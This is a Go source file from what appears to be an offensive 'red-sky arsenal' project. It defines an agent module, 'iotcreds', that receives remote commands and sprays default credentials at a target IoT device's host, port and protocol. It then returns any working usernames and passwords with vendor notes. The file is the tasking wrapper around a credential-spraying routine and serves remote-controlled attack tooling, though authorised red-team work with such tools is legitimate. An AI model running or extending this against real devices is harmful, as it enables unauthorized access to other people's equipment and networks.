package agentfw

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
)

type iotcredsModule struct{}

func init() { Register(iotcredsModule{}) }

func (iotcredsModule) Name() string { return "iotcreds" }

// Run parses the wire args sent by SendIoTCredsStart:
//
//	[host, port, protocol, path, timeout, stop-first]
//
// Positional, all strings. Port/timeout default to 0 (protocol default).
// stop-first is "1" / "true" for true, anything else for false.
func (iotcredsModule) Run(ctx context.Context, args []string) Result {
	if len(args) < 3 {
		return Result{
			Err:      fmt.Errorf("iotcreds needs <host> <port> <protocol> [path] [timeout] [stop-first]"),
			ExitCode: 2,
		}
	}
	host := args[0]
	port, _ := strconv.Atoi(args[1])
	protocol := args[2]
	path := "/"
	timeout := 0
	stopFirst := false
	if len(args) >= 4 && args[3] != "" {
		path = args[3]
	}
	if len(args) >= 5 && args[4] != "" {
		if n, err := strconv.Atoi(args[4]); err == nil {
			timeout = n
		}
	}
	if len(args) >= 6 {
		stopFirst = args[5] == "1" || strings.EqualFold(args[5], "true")
	}

	hits, err := iotcreds.Spray(ctx, iotcreds.SprayOptions{
		Host:      host,
		Port:      port,
		Protocol:  protocol,
		Path:      path,
		Timeout:   timeout,
		StopFirst: stopFirst,
	}, func(i int, c iotcreds.Cred, ok bool) {
		// onAttempt is per-credential feedback; the wire Result is the final
		// summary. Silent here — the hits slice carries the outcome.
	})
	if err != nil {
		return Result{Err: err, ExitCode: 1}
	}

	var b strings.Builder
	fmt.Fprintf(&b, "iotcreds %s:%d proto=%s -> %d hit(s)\n", host, port, protocol, len(hits))
	for _, h := range hits {
		fmt.Fprintf(&b, "  %s:%d %s  %s:%s", h.Host, h.Port, h.Protocol, h.User, h.Pass)
		if h.Vendor != "" {
			fmt.Fprintf(&b, "  vendor=%s", h.Vendor)
		}
		if h.Note != "" {
			fmt.Fprintf(&b, "  note=%s", h.Note)
		}
		b.WriteString("\n")
	}
	if len(hits) == 0 {
		b.WriteString("  (no credentials matched)\n")
	}
	return Result{Output: b.String(), ExitCode: 0}
}
